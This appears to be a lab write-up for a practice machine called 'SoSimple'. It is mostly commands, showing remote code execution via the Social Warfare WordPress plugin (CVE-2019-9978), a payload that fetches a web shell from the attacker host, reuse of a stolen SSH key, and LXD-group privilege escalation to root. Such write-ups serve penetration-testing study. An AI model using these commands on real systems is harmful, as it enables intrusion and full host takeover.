# SoSimple

**IP Address:** 192.168.238.78

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22 | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) |
| 80 | http | Apache httpd 2.4.41 ((Ubuntu)) |

* Wordpress users
admin
max

## Exploitation
### Exploit Details (wpscan)
* **Name** - Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
* **CVE** - 2019-9978
* **Module** - N/A
* **Disclosed** - 2019-03-25 
* **References**
  * https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618

Commands
```
echo "<pre>system('wget http://192.168.49.238/shell.php')</pre>" > /root/share/payload.txt
curl "http://$ip/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$lhost/payload.txt"
curl "http://$ip/wordpress/wp-admin/shell.php"
whoami
cat /home/max/local.txt
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

![Execute Exploit](images/exploit3.png)

## Privilege Escalation
### Exploit Details (LXD Group)
* **Name** - LXD Group
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. First we need to elevate to the max user account as he is part of the LXD group which will give us root permissions. His .ssh directory is open so we can simply copy his ssh key and use it to login via ssh. 

Commands
```
chmod 600 id_rsa
ssh max@$ip -i id_rsa
whoami
```

![Execute Exploit](images/privesc1.png)

2. Now we can import a container and mount the root file system. 
Commands
```bash
wget http://$lhost/linux/privesc/lxd/lxd.tar.xz
wget http://$lhost/linux/privesc/lxd/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxd init
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc2.png)

![Execute Exploit](images/privesc3.png)

## Loot
```
local.txt
b345e9c0b93d504bb2893c9858c397cf
proof.txt
f13d523cd78c0867773e8e58e3029afc
```